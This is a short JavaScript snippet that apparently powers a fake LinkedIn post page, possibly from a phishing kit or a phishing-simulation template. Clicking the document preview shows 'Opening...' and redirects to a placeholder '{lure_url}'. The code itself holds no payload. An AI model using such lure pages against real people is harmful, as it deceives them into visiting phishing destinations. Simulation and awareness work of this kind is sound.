function viewDocument() {
    const btn = document.querySelector('.btn-view-doc');
    btn.innerHTML = '<span>Opening...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1200);
}

document.querySelector('.document-preview').addEventListener('click', (e) => {
    if (!e.target.closest('.btn-view-doc')) {
        viewDocument();
    }
});

document.addEventListener('DOMContentLoaded', () => {
    const post = document.querySelector('.linkedin-post');
    post.style.opacity = '0';
    post.style.transform = 'translateY(20px)';
    
    setTimeout(() => {
        post.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        post.style.opacity = '1';
        post.style.transform = 'translateY(0)';
    }, 200);
});
